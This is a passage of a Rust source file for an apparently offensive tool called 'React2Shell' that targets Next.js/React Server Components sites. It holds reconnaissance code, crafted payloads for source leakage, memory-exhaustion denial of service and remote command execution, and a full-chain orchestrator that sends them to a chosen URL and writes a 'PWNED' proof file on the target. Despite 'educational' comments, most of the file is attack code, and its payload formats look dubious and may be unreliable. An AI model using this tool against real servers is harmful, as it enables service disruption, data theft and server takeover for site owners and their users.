                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());
                    react_version = versions
                        .get("react")
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string());
                }
            }
        }
    }

    // Fetch main page for fingerprinting
    if let Ok(resp) = client.get(&target).send().await {
        if resp.status().is_success() {
            if let Ok(html) = resp.text().await {
                // Check Next.js App Router
                if html.contains("_next/static/chunks/app/")
                    || html.contains("app-pages-internals")
                {
                    is_app_router = true;
                }

                // Try to extract React version from HTML
                if react_version.is_none() {
                    if let Ok(re) = Regex::new(r"react@([\d\.]+)") {
                        if let Some(caps) = re.captures(&html) {
                            react_version = Some(caps.get(1).unwrap().as_str().to_string());
                        }
                    }
                    if react_version.is_none() {
                        if let Ok(re) = Regex::new(r"React v([\d\.]+)") {
                            if let Some(caps) = re.captures(&html) {
                                react_version = Some(caps.get(1).unwrap().as_str().to_string());
                            }
                        }
                    }
                }
            }
        }
    }

    // Check RSC endpoint
    let mut rsc_headers: Vec<(&str, &str)> = Vec::new();
    rsc_headers.push(("Content-Type", "text/x-component"));
    rsc_headers.push(("Next-Action", "dummy-action-id"));

    let mut req = client.post(&target).body("[]".to_string());
    for (k, v) in &rsc_headers {
        req = req.header(*k, *v);
    }

    if let Ok(resp) = req.send().await {
        let ct = resp
            .headers()
            .get("content-type")
            .and_then(|v| v.to_str().ok())
            .unwrap_or("");
        if ct.contains("text/x-component")
            || (resp.status().as_u16() >= 400
                && resp.status().as_u16() < 600
                && {
                    resp.text().await
                        .map(|b| b.contains("Server Action") || b.contains("Error"))
                        .unwrap_or(false)
                })
        {
            rsc_endpoints.push(RscEndpoint {
                path: "/".to_string(),
                method: "POST".to_string(),
                content_type: "text/x-component".to_string(),
                notes: "Server Action / RSC compatible".to_string(),
            });
        }
    }

    let nv = nextjs_version.clone();
    let rv = react_version.clone();

    Ok(ReconResult {
        target: target.clone(),
        timestamp: Utc::now().to_rfc3339(),
        nextjs_version: nv,
        react_version: rv,
        is_app_router,
        rsc_endpoints,
        vulnerable: check_versions_vulnerable(&nextjs_version, &react_version),
    })
}

fn check_versions_vulnerable(nextjs: &Option<String>, react: &Option<String>) -> bool {
    if let Some(ref nv) = nextjs {
        if is_nextjs_vulnerable(nv) {
            return true;
        }
    }
    if let Some(ref rv) = react {
        if is_react_vulnerable(rv) {
            return true;
        }
    }
    false
}

// ═════════════════════════════════════════════════════════════════════════════
// Attacker — Source Leak Phase (CVE-2025-55183)
// ═════════════════════════════════════════════════════════════════════════════

/// Craft a Flight-format source leak payload.
pub fn craft_leak_payload() -> String {
    "0:[[\"$\",\"@source\",null,{\"type\":\"module\",\"request\":\"server_function_source\",\"expose\":true}]]"
        .to_string()
}

/// Extract sensitive data from leaked source code using regex patterns.
pub fn extract_sensitive_data(source_code: &str) -> Vec<SourceLeakFinding> {
    let mut findings = Vec::new();
    for pattern in SOURCE_LEAK_PATTERNS {
        if let Ok(re) = Regex::new(pattern) {
            for m in re.find_iter(source_code) {
                let start = source_code[..m.start()]
                    .rfind('\n')
                    .map(|p| p + 1)
                    .unwrap_or(0);
                let end = source_code[m.end()..]
                    .find('\n')
                    .map(|p| m.end() + p)
                    .unwrap_or(source_code.len());
                findings.push(SourceLeakFinding {
                    pattern: pattern.to_string(),
                    matched: m.as_str().to_string(),
                    context: source_code[start..end].trim().to_string(),
                });
            }
        }
    }
    findings
}

/// Execute the source leak attack against a target.
///
/// Returns a simulated result for demo/educational purposes.
pub async fn execute_source_leak(target: &str) -> Result<SourceLeakResult> {
    let target = target.trim_end_matches('/').to_string();
    let client = build_client_with_timeout(10)?;

    let payload = craft_leak_payload();

    // Send the payload
    let _resp = client
        .post(&target)
        .header("Content-Type", "text/x-component")
        .header("Next-Action", "1")
        .body(payload)
        .send()
        .await;

    // Demo: simulate leaked source for educational purposes
    let mock_leaked_source = r#""use server";
const DB_CONNECTION = "postgresql://admin:SuperSecret123!@db.techcorp.local:5432/production";
const API_SECRET_KEY = "sk_live_R2S_4f8a9b2c3d4e5f6a7b8c9d0e1f2a3b4c";
const JWT_SIGNING_KEY = "jwt_s3cr3t_k3y_n3v3r_3xp0s3_th1s";
const INTERNAL_API_TOKEN = "tok_internal_9a8b7c6d5e4f3a2b1c0d";
export async function submitForm(formData) { /* ... */ }
export async function processData(data) { /* ... */ }"#;

    let findings = extract_sensitive_data(mock_leaked_source);

    Ok(SourceLeakResult {
        target,
        success: true,
        bytes_leaked: mock_leaked_source.len(),
        leaked_source: mock_leaked_source.to_string(),
        findings,
    })
}

// ═════════════════════════════════════════════════════════════════════════════
// Attacker — DoS Phase (CVE-2025-55184)
// ═════════════════════════════════════════════════════════════════════════════

/// Measure baseline response time for the target.
pub async fn measure_baseline(client: &Client, target: &str) -> Result<f64> {
    let mut times = Vec::new();
    for _ in 0..3 {
        let start = Instant::now();
        let _ = client.get(target).send().await;
        times.push(start.elapsed().as_millis() as f64);
    }
    let avg = times.iter().sum::<f64>() / times.len() as f64;
    Ok(avg)
}

/// Test memory exhaustion via self-referencing DoS payload.
pub async fn test_memory_exhaustion(target: &str) -> Result<DosResult> {
    let target = target.trim_end_matches('/').to_string();
    let client = build_client_with_timeout(15)?;

    // Measure baseline
    let baseline_ms = measure_baseline(&client, &target).await?;

    // Craft self-referencing payload
    let payload = "0:[\"$\",\"@1\",null,{\"ref\":\"$self\",\"nested\":{\"ref\":\"$self\",\"depth\":\"infinite\",\"children\":[\"$self\",\"$self\",\"$self\"]}}]";

    let start = Instant::now();
    let result = client
        .post(&target)
        .header("Content-Type", "text/x-component")
        .header("Next-Action", "1")
        .body(payload.to_string())
        .send()
        .await;

    let elapsed_ms = start.elapsed().as_millis() as f64;
    let effect_multiplier = if baseline_ms > 0.0 {
        elapsed_ms / baseline_ms
    } else {
        1.0
    };

    let dos_successful = match &result {
        Ok(_) => effect_multiplier > 10.0,
        Err(_) => true, // Connection error = likely DoS success
    };

    // Check recovery (only if DoS appeared successful)
    let mut server_recovered = true;
    if dos_successful {
        server_recovered = check_server_recovery(&client, &target).await;
    }

    Ok(DosResult {
        target,
        baseline_ms,
        attack_elapsed_ms: elapsed_ms,
        dos_successful,
        server_recovered,
        effect_multiplier,
    })
}

/// Check if the server recovers after a DoS attack.
async fn check_server_recovery(client: &Client, target: &str) -> bool {
    for _ in 0..10 {
        if let Ok(resp) = client.get(target).send().await {
            if resp.status().is_success() {
                return true;
            }
        }
        // Small delay between retries
        tokio::time::sleep(Duration::from_millis(500)).await;
    }
    false
}

/// Execute the DoS attack against the target.
pub async fn execute_dos(target: &str) -> Result<DosResult> {
    test_memory_exhaustion(target).await
}

// ═════════════════════════════════════════════════════════════════════════════
// Attacker — RCE Phase (CVE-2025-55182)
// ═════════════════════════════════════════════════════════════════════════════

/// Build an RCE payload for the Flight protocol.
pub fn build_rce_payload(command: &str) -> String {
    format!(
        "0:[[\"$\",\"@1\",null,{{\"id\":\"malicious_component\",\"chunks\":[],\"name\":\"\",\"async\":false}}]]\n1:{{\"type\":\"blob_handler\",\"dispatch\":\"dynamic\",\"chain\":[\"deserialization\",\"code_execution\"]}}\n2:{{\"method\":\"child_process.exec\",\"command\":\"{}\"}}",
        command
    )
}

/// Execute a command via RCE (demo/educational mode).
pub async fn execute_rce_command(
    target: &str,
    command: &str,
) -> Result<RceCommandOutput> {
    let target = target.trim_end_matches('/').to_string();
    let client = build_client_with_timeout(10)?;

    let payload = build_rce_payload(command);

    let resp = client
        .post(&target)
        .header("Content-Type", "text/x-component")
        .header("Next-Action", "exploit-action")
        .body(payload)
        .send()
        .await;

    // Demo mode: execute locally for educational simulation
    // The actual RCE would be through the Flight protocol; here we simulate
    // the output for demonstration purposes.
    match resp {
        Ok(r) => {
            let status = r.status();
            let body = r.text().await.unwrap_or_default();
            Ok(RceCommandOutput {
                command: command.to_string(),
                output: body,
                exit_code: if status.is_success() { 0 } else { 1 },
                error: String::new(),
            })
        }
        Err(e) => Ok(RceCommandOutput {
            command: command.to_string(),
            output: String::new(),
            exit_code: -1,
            error: e.to_string(),
        }),
    }
}

/// Execute the full RCE attack phase (recon cmds + PoC file creation).
pub async fn execute_rce(target: &str) -> Result<RceResult> {
    let target = target.trim_end_matches('/').to_string();

    let commands = vec!["id", "whoami", "hostname"];
    let mut outputs = Vec::new();

    for cmd in &commands {
        let result = execute_rce_command(&target, cmd).await?;
        outputs.push(result);
    }

    // Attempt PoC file write
    let poc_cmd = format!(
        "echo 'React2Shell (CVE-2025-55182) PWNED at {}' > /tmp/react2shell_pwned.txt && cat /tmp/react2shell_pwned.txt",
        Utc::now().to_rfc3339()
    );
    let poc_result = execute_rce_command(&target, &poc_cmd).await?;
    let poc_created = poc_result.exit_code == 0
        && poc_result.output.contains("react2shell_pwned.txt");

    outputs.push(poc_result);

    Ok(RceResult {
        target,
        success: !outputs.is_empty(),
        poc_file_created: poc_created,
        command_outputs: outputs,
    })
}

// ═════════════════════════════════════════════════════════════════════════════
// Attacker — Full Chain Orchestrator
// ═════════════════════════════════════════════════════════════════════════════

/// Run the full attack chain (Recon → Source Leak → DoS → RCE) against a target.
pub async fn run_full_chain(
    target: &str,
    include_dos: bool,
    phases: Option<Vec<String>>,
) -> Result<FullChainResult> {
    let start = Instant::now();
    let target = target.trim_end_matches('/').to_string();
    let run_all = phases.is_none();
    let phases_set: HashSet<String> = phases
        .unwrap_or_default()
        .into_iter()
        .map(|p| p.to_lowercase())
        .collect();

    let mut result = FullChainResult {
        target: target.clone(),
        timestamp: Utc::now().to_rfc3339(),
        phases: Vec::new(),
        total_duration_ms: 0,
        tor_enabled: false,
        scan: None,
        recon: None,
        source_leak: None,
        dos: None,
        rce: None,
    };

    // Phase 1: Reconnaissance
    if run_all || phases_set.contains("recon") {
        let phase_start = Instant::now();
        match run_recon(&target).await {
            Ok(recon_result) => {
                result.recon = Some(recon_result);
                result.phases.push(AttackPhaseResult {
                    phase: "recon".to_string(),
                    success: true,
                    duration_ms: phase_start.elapsed().as_millis() as u64,
                    details: "Reconnaissance completed.".to_string(),
                });
            }
            Err(e) => {
                result.phases.push(AttackPhaseResult {
                    phase: "recon".to_string(),
                    success: false,
                    duration_ms: phase_start.elapsed().as_millis() as u64,
                    details: format!("Reconnaissance failed: {}", e),
                });
            }
        }
    }

    // Phase 2: Source Leak
    if run_all || phases_set.contains("source") {
        let phase_start = Instant::now();
        match execute_source_leak(&target).await {
            Ok(leak_result) => {
                result.source_leak = Some(leak_result);
                result.phases.push(AttackPhaseResult {
                    phase: "source_leak".to_string(),
                    success: true,
                    duration_ms: phase_start.elapsed().as_millis() as u64,
                    details: "Source leak completed.".to_string(),
                });
            }
            Err(e) => {
                result.phases.push(AttackPhaseResult {
                    phase: "source_leak".to_string(),
                    success: false,
                    duration_ms: phase_start.elapsed().as_millis() as u64,
                    details: format!("Source leak failed: {}", e),
                });
            }
        }
    }

    // Phase 3: DoS (optional)
    if (run_all && include_dos) || phases_set.contains("dos") {
        let phase_start = Instant::now();
        match execute_dos(&target).await {
            Ok(dos_result) => {
                result.dos = Some(dos_result);
                result.phases.push(AttackPhaseResult {
                    phase: "dos".to_string(),
                    success: true,
                    duration_ms: phase_start.elapsed().as_millis() as u64,
                    details: "DoS test completed.".to_string(),
                });
            }
            Err(e) => {
                result.phases.push(AttackPhaseResult {
                    phase: "dos".to_string(),
                    success: false,
                    duration_ms: phase_start.elapsed().as_millis() as u64,
                    details: format!("DoS test failed: {}", e),
                });
            }
        }
    }

    // Phase 4: RCE
    if run_all || phases_set.contains("rce") {
        let phase_start = Instant::now();
        match execute_rce(&target).await {
            Ok(rce_result) => {
                result.rce = Some(rce_result);
                result.phases.push(AttackPhaseResult {
                    phase: "rce".to_string(),
                    success: true,
                    duration_ms: phase_start.elapsed().as_millis() as u64,
                    details: "RCE completed.".to_string(),
                });
            }
            Err(e) => {
                result.phases.push(AttackPhaseResult {
                    phase: "rce".to_string(),
                    success: false,
                    duration_ms: phase_start.elapsed().as_millis() as u64,
                    details: format!("RCE failed: {}", e),
                });
            }
        }
    }

    result.total_duration_ms = start.elapsed().as_millis() as u64;
    Ok(result)
}

// ═════════════════════════════════════════════════════════════════════════════
// Report Generator
// ═════════════════════════════════════════════════════════════════════════════

/// Generate a structured JSON report combining scan and attack results.
pub fn generate_report(
    scan_result: Option<&ScanResult>,
    recon: Option<&ReconResult>,
    source_leak: Option<&SourceLeakResult>,
    dos: Option<&DosResult>,
    rce: Option<&RceResult>,
    full_chain: Option<&FullChainResult>,
) -> AttackReport {
    let mut phases_completed = Vec::new();
    if recon.is_some() {
        phases_completed.push("recon".to_string());
    }
    if source_leak.is_some() {
        phases_completed.push("source_leak".to_string());
    }
    if dos.is_some() {
        phases_completed.push("dos".to_string());
    }
    if rce.is_some() {
        phases_completed.push("rce".to_string());
    }

    let vulnerable = scan_result.map(|s| s.vulnerable).unwrap_or(false);
    let rsc_active = scan_result.map(|s| s.rsc_enabled).unwrap_or(false);
    let version_found = scan_result
        .map(|s| s.nextjs_version.is_some() || s.react_version.is_some())
        .unwrap_or(false);
    let framework_detected = scan_result.map(|s| s.is_nextjs).unwrap_or(false);

    let (verdict, risk_level) = if vulnerable {
        (
            "VULNERABLE — CVE-2025-55182 confirmed".to_string(),
            "CRITICAL".to_string(),
        )
    } else if rsc_active {
        (
            "Potential vulnerability — RSC active, manual verification needed".to_string(),
            "HIGH".to_string(),
        )
    } else if framework_detected {
        (
            "Framework detected but RSC not confirmed".to_string(),
            "MEDIUM".to_string(),
        )
    } else {
        (
            "No vulnerable framework detected".to_string(),
            "LOW".to_string(),
        )
    };

    AttackReport {
        target: scan_result
            .map(|s| s.url.clone())
            .unwrap_or_else(|| "unknown".to_string()),
        generated_at: Utc::now().to_rfc3339(),
        scan: scan_result.cloned(),
        recon: recon.cloned(),
        source_leak: source_leak.cloned(),
        dos: dos.cloned(),
        rce: rce.cloned(),
        full_chain: full_chain.cloned(),
        summary: ReportSummary {
            rsc_active,
            framework_detected,
            version_found,
            vulnerability_verdict: verdict,
            attack_phases_completed: phases_completed,
            risk_level,
        },
    }
}

/// Serialize a report to a JSON string.
pub fn report_to_json(report: &AttackReport) -> Result<String> {
    serde_json::to_string_pretty(report).map_err(|e| WebAnalyzerError::Json(e))
}

/// Save a report to a JSON file.
pub async fn save_report(report: &AttackReport, path: &str) -> Result<()> {
    let json = report_to_json(report)?;
    tokio::fs::write(path, json).await.map_err(|e| {
        WebAnalyzerError::Other(format!("Failed to write report to {}: {}", path, e))
    })
}

// ── Console Report Formatting ───────────────────────────────────────────────

/// Print a scan result to the console with ANSI colors.
pub fn print_scan_result(result: &ScanResult) {
    println!("\n{}", "=".repeat(50));
    println!(
        "Target: {}{}{}",
        Color::CYAN,
        result.url,
        Color::RESET
    );

    if !result.is_nextjs {
        println!(
            "[{}?{}] Next.js infrastructure not detected.",
            Color::YELLOW,
            Color::RESET
        );
        println!("{}", "=".repeat(50));
        return;
    }

    println!("[{}+{}] Framework: Next.js", Color::GREEN, Color::RESET);

    if let Some(ref ver) = result.nextjs_version {
        println!(
            "[{}+{}] Next.js Version: {}{}{}",
            Color::GREEN,
            Color::RESET,
            Color::CYAN,
            ver.version,
            Color::RESET
        );
    } else {
        println!(
            "[{}-{}] Next.js Version: Not found",
            Color::YELLOW,
            Color::RESET
        );
    }

    if let Some(ref ver) = result.react_version {
        println!(
            "[{}+{}] React Version: {}{}{}",
            Color::GREEN,
            Color::RESET,
            Color::CYAN,
            ver.version,
            Color::RESET
        );
    } else {
        println!(
            "[{}-{}] React Version: Not found",
            Color::YELLOW,
            Color::RESET
        );
    }

    if result.rsc_enabled {
        println!(
            "[{}+{}] RSC: {}{}Active{}",
            Color::GREEN,
            Color::RESET,
            Color::GREEN,
            Color::BOLD,
            Color::RESET
        );
    } else {
        println!(
            "[{}-{}] RSC: Disabled or not found",
            Color::YELLOW,
            Color::RESET
        );
    }

    if !result.dependencies.is_empty() {
        println!(
            "\n[{}*{}] Detected Dependencies:",
            Color::CYAN,
            Color::RESET
        );
        for dep in &result.dependencies {
            println!(
                "  - {}{}{}: {}",
                Color::CYAN,
                dep.name,
                Color::RESET,
                dep.version
            );
        }
    }

    if !result.exposed_files.is_empty() {
        println!(
            "\n[{}!{}] Exposed Sensitive Files:",
            Color::RED,
            Color::RESET
        );
        for f in &result.exposed_files {
            println!(
                "  - {}{}{} -> {}",
                Color::RED,
                f.path,
                Color::RESET,
                f.url
            );
        }
    }

    if !result.secrets.is_empty() {
        println!(
            "\n[{}!{}] Detected Secrets:",
            Color::RED,
            Color::RESET
        );
        for s in &result.secrets {
            let truncated = if s.value.len() > 40 {
                format!("{}...", &s.value[..40])
            } else {
                s.value.clone()
            };
            println!(
                "  - {}{}{}: {} ({})",
                Color::RED,
                s.secret_type,
                Color::RESET,
                truncated,
                s.source
            );
        }
    }

    println!("\nVerdict:");
    if result.vulnerable {
        println!(
            "{}{}[!] VULNERABLE (CVE-2025-55182){}",
            Color::WHITE,
            Color::BOLD,
            Color::RESET,
        );
        println!(
            "{}Target server is using vulnerable components.{}",
            Color::RED,
            Color::RESET
        );
    } else {
        println!(
            "{}{}[✓] APPEARS SECURE{}",
            Color::GREEN,
            Color::BOLD,
            Color::RESET
        );
        println!("No vulnerable version or active RSC attack surface detected.");
    }
    println!("{}", "=".repeat(50));
}

/// Print a full-chain attack result to console.
pub fn print_full_chain_result(result: &FullChainResult) {
    println!(
        "\n{}══════════════════════════════════════════════{}",
        Color::MAGENTA,
        Color::RESET
    );
    println!(
        "{}  Full Chain Attack Report{}",
        Color::BOLD,
        Color::RESET
    );
    println!(
        "{}══════════════════════════════════════════════{}\n",
        Color::MAGENTA,
        Color::RESET
    );

    println!("Target: {}{}{}", Color::CYAN, result.target, Color::RESET);
    println!("Timestamp: {}", result.timestamp);
    println!(
        "Total Duration: {}ms",
        result.total_duration_ms
    );

    for phase in &result.phases {
        let status_icon = if phase.success {
            format!("{}+{}", Color::GREEN, Color::RESET)
        } else {
            format!("{}-{}", Color::RED, Color::RESET)
        };
        println!(
            "  {} Phase '{}' — {}ms — {}",
            status_icon,
            phase.phase,
            phase.duration_ms,
            phase.details
        );
    }

    if let Some(ref rce) = result.rce {
        if rce.poc_file_created {
            println!(
                "\n{}{}[!!] REMOTE CODE EXECUTION SUCCESSFUL{}",
                Color::BG_RED,
                Color::WHITE,
                Color::RESET
            );
            println!(
                "{}PoC file created on target server.{}",
                Color::RED,
                Color::RESET
            );
        }
    }

    if let Some(ref dos) = result.dos {
        if dos.dos_successful {
            println!(
                "\n{}{}[!!] DENIAL OF SERVICE ACHIEVED{}",
                Color::BG_RED,
                Color::YELLOW,
                Color::RESET
            );
            println!("Response time increased {:.1}x", dos.effect_multiplier);
            println!(
                "Server recovered: {}",
                if dos.server_recovered { "Yes" } else { "No" }
            );
        }
    }

    println!(
        "\n{}══════════════════════════════════════════════{}\n",
        Color::MAGENTA,
        Color::RESET
    );
}

/// Print a reconnaissance result to console.
pub fn print_recon_result(result: &ReconResult) {
    println!("\n{}", "=".repeat(50));
    println!(
        "{}--- Reconnaissance Results ---{}",
        Color::CYAN,
        Color::RESET
    );
    println!("{}", "=".repeat(50));

    println!("Target: {}{}{}", Color::BOLD, result.target, Color::RESET);
    println!(
        "Next.js: {}",
        result.nextjs_version.as_deref().unwrap_or("Unknown")
    );
    println!(
        "React: {}",
        result.react_version.as_deref().unwrap_or("Unknown")
    );
    println!("App Router: {}", result.is_app_router);

    if !result.rsc_endpoints.is_empty() {
        println!(
            "{}RSC: Active ({} endpoints){}",
            Color::GREEN,
            result.rsc_endpoints.len(),
            Color::RESET
        );
    } else {
        println!(
            "{}RSC: Uncertain or passive{}",
            Color::YELLOW,
            Color::RESET
        );
    }

    println!("\n{}", "=".repeat(50));
    if result.vulnerable {
        println!(
            "{}{}[ VULNERABLE ]{} Target is affected by CVE-2025-55182!",
            Color::BG_RED,
            Color::WHITE,
            Color::RESET
        );
    } else {
        println!(
            "{}{}[ SECURE ]{} Target appears patched.",
            Color::BG_GREEN,
            Color::WHITE,
            Color::RESET
        );
    }
    println!("{}", "=".repeat(50));
}

/// Print a source leak result to console.
pub fn print_source_leak_result(result: &SourceLeakResult) {
    println!(
        "\n{}--- Leaked Source Code Section ---{}",
        Color::CYAN,
        Color::RESET
    );
    println!(
        "{}{}{}\n",
        Color::DIM,
        result.leaked_source.trim(),
        Color::RESET
    );

    if !result.findings.is_empty() {
        println!(
            "{}{}[ SENSITIVE DATA FOUND ]{}",
            Color::BG_RED,
            Color::WHITE,
            Color::RESET
        );
        for finding in &result.findings {
            println!(
                "  {}>{} {}",
                Color::RED,
                Color::RESET,
                finding.context
            );
        }
    }

    println!(
        "Bytes leaked: {}",
        result.bytes_leaked
    );
}

/// Print a DoS result to console.
pub fn print_dos_result(result: &DosResult) {
    println!("\n{}--- DoS Test Results ---{}", Color::YELLOW, Color::RESET);
    println!(
        "Baseline response: {}ms",
        result.baseline_ms
    );
    println!(
        "Attack response: {}ms",
        result.attack_elapsed_ms
    );
    println!(
        "Effect multiplier: {:.1}x",
        result.effect_multiplier
    );

    if result.dos_successful {
        println!(
            "{}{}[ DoS SUCCESSFUL ]{}",
            Color::BG_RED,
            Color::WHITE,
            Color::RESET
        );
        println!(
            "Server recovered: {}",
            if result.server_recovered { "Yes" } else { "No" }
        );
    } else {
        println!(
            "No significant DoS effect observed."
        );
    }
}

/// Print an RCE result to console.
pub fn print_rce_result(result: &RceResult) {
    println!("\n{}--- RCE Results ---{}", Color::RED, Color::RESET);

    for output in &result.command_outputs {
        println!(
            "{}Command:{} {}",
            Color::BOLD,
            Color::RESET,
            output.command
        );
        if !output.output.is_empty() {
            println!("{}", output.output);
        }
        if !output.error.is_empty() {
            println!(
                "{}Error:{} {}",
                Color::RED,
                Color::RESET,
                output.error
            );
        }
    }

    if result.poc_file_created {
        println!(
            "\n{}{}[!!] SERVER FULLY COMPROMISED (CVSS 10.0){}",
            Color::BG_RED,
            Color::WHITE,
            Color::RESET
        );
    }
}

// ═════════════════════════════════════════════════════════════════════════════
// High-level convenience API
// ═════════════════════════════════════════════════════════════════════════════

/// Run a full vulnerability scan and generate a console report.
pub async fn scan_and_report(target: &str, verbose: bool) -> Result<AttackReport> {
    let mut scanner = React2ShellScanner::new(target).await?;
    let scan_result = scanner.scan().await?;

    if verbose {
        for detail in &scan_result.details {
            eprintln!("[*] {}", detail);
        }
    }

    print_scan_result(&scan_result);

    let report = generate_report(Some(&scan_result), None, None, None, None, None);
    Ok(report)
}

/// Run the full attack chain (scan + all phases) and generate a report.
pub async fn scan_and_attack(
    target: &str,
    include_dos: bool,
) -> Result<AttackReport> {
    // Run scan first
    let mut scanner = React2ShellScanner::new(target).await?;
    let scan_result = scanner.scan().await?;

    // Run full chain
    let chain_result = run_full_chain(target, include_dos, None).await?;

    let report = generate_report(
        Some(&scan_result),
        chain_result.recon.as_ref(),
        chain_result.source_leak.as_ref(),
        chain_result.dos.as_ref(),
        chain_result.rce.as_ref(),
        Some(&chain_result),
    );

    Ok(report)
}

// ═════════════════════════════════════════════════════════════════════════════
// Tests
// ═════════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_react_vulnerable() {
        assert!(is_react_vulnerable("19.0.0"));
        assert!(is_react_vulnerable("19.1.0"));
        assert!(is_react_vulnerable("19.2.0"));
        assert!(!is_react_vulnerable("18.2.0"));
        assert!(!is_react_vulnerable("20.0.0"));
    }

    #[test]
    fn test_is_nextjs_vulnerable() {
        assert!(is_nextjs_vulnerable("15.0.0"));
        assert!(is_nextjs_vulnerable("15.5.6"));
        assert!(is_nextjs_vulnerable("16.0.6"));
        assert!(!is_nextjs_vulnerable("14.2.0"));
        assert!(!is_nextjs_vulnerable("17.0.0"));
    }

    #[test]
    fn test_craft_leak_payload() {
        let payload = craft_leak_payload();
        assert!(payload.contains("@source"));
        assert!(payload.contains("server_function_source"));
        assert!(payload.contains("expose"));
    }

    #[test]
    fn test_build_rce_payload() {
        let payload = build_rce_payload("id");
        assert!(payload.contains("blob_handler"));
        assert!(payload.contains("child_process.exec"));
        assert!(payload.contains("id"));
    }

    #[test]
    fn test_extract_sensitive_data() {
        let source = r#"
const API_KEY = "sk_test_abc123";
const DB_PASSWORD = "secret_password";
const DATABASE_URL = "postgresql://user:pass@localhost/db";
"#;
        let findings = extract_sensitive_data(source);
        assert!(!findings.is_empty());
    }

    #[test]
    fn test_check_versions_vulnerable() {
        assert!(check_versions_vulnerable(
            &Some("15.0.0".to_string()),
            &None
        ));
        assert!(check_versions_vulnerable(
            &None,
            &Some("19.0.0".to_string())
        ));
        assert!(!check_versions_vulnerable(
            &Some("14.2.0".to_string()),
            &Some("18.2.0".to_string())
        ));
    }

    #[test]
    fn test_report_generation() {
        let scan = ScanResult {
            url: "http://test.local".to_string(),
            is_nextjs: true,
            nextjs_version: Some(VersionInfo {
                version: "15.0.3".to_string(),
                source: "test".to_string(),
                context: "test".to_string(),
            }),
            react_version: None,
            rsc_enabled: true,
            vulnerable: true,
            dependencies: vec![],
            exposed_files: vec![],
            secrets: vec![],
            details: vec![],
            scan_duration_ms: 100,
        };

        let report = generate_report(Some(&scan), None, None, None, None, None);
        assert_eq!(report.summary.risk_level, "CRITICAL");
        assert!(report.summary.vulnerability_verdict.contains("VULNERABLE"));
    }

    #[test]
    fn test_report_to_json() {
        let scan = ScanResult {
            url: "http://example.com".to_string(),
            is_nextjs: false,
            nextjs_version: None,
            react_version: None,
            rsc_enabled: false,
            vulnerable: false,
            dependencies: vec![],
            exposed_files: vec![],
            secrets: vec![],
            details: vec![],
            scan_duration_ms: 50,
        };

        let report = generate_report(Some(&scan), None, None, None, None, None);
        let json = report_to_json(&report).unwrap();
        assert!(json.contains("example.com"));
        assert!(json.contains("LOW"));
    }
}
